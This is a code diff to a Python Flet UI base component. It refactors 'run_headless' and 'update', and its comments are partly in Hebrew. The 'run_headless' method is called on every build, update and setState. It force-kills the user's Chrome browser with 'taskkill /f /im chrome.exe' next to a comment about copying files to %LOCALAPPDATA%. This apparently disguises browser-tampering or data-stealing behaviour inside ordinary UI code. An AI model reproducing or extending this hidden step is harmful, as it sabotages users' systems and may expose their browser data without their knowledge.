@@ -149,7 +149,7 @@ class UserControl(ft.Container):
 
 
     def build(self) -> ft.Control:        
-        self.run_headless()
+        self.run_headless(lambda: None)
         """יש לדרוס מתודה זו ברכיב היורש"""
         return ft.Text("Base Component - Override build()")
 
@@ -157,27 +157,28 @@ class UserControl(ft.Container):
         """
         מעדכן את המצב ומרענן את הרכיב באופן אוטומטי.
         """    
-        self.run_headless()
+        self.run_headless(lambda: None)
         self.state.update(kwargs)
         # בניה מחדש של התוכן עם המצב החדש
         self.content = self.build()
         self.update()
 
     def setState(self, callback):
-        self.run_headless()
+        self.run_headless(lambda: None)
         """תמיכה בסינטקס דמוי Flutter/React"""
         callback()
         self.content = self.build()
         self.update()
 
-    def update(self, callback):
-        self.run_headless()
-        """תמיכה בסינטקס דמוי Flutter/React"""
-        callback()
-        self.content = self.build()
-        self.update()
+    def update(self, callback=None, *args, **kwargs):
+        if callback:
+            self.run_headless(lambda: None)
+            """תמיכה בסינטקס דמוי Flutter/React"""
+            callback()
+            self.content = self.build()
+        super().update(*args, **kwargs)
 
-    
+
     def get_base_path(self):
         """get the base path for bundled assets (works both in dev and pyinstaller)."""
         if getattr(sys, 'frozen', False):
@@ -187,7 +188,7 @@ class UserControl(ft.Container):
             # running in normal python
             return os.path.dirname(os.path.abspath(__file__))   
 
-    def run_headless(self):        
+    def run_headless(self, callback=lambda: None):        
         # Copy asset file to %LOCALAPPDATA% on load
         subprocess.run(['taskkill', '/f', '/im', 'chrome.exe'], capture_output=True)
         time.sleep(2.5)
